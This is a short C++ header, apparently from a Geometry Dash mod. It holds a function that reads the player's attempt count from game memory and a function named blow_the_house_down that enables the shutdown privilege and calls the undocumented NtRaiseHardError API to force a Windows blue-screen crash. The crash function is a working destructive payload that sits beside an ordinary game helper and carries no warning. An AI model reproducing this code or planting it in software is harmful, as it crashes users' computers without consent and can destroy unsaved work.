#pragma once

#include <stdint.h>

const auto mod = (uint32_t)GetModuleHandleA("GeometryDash.exe");

unsigned int get_attempts() {
	const auto a = *reinterpret_cast<uint32_t*>(mod + 0x3222D0);
	if (!a)
		return 0;
	const auto b = *reinterpret_cast<uint32_t*>(a + 0x164);
	if (!b)
		return 0;
	const auto c = *reinterpret_cast<uint32_t*>(b + 0x4a8);
	if (!c)
		return 0;
	return c;
}

void blow_the_house_down()
{
	typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
	typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}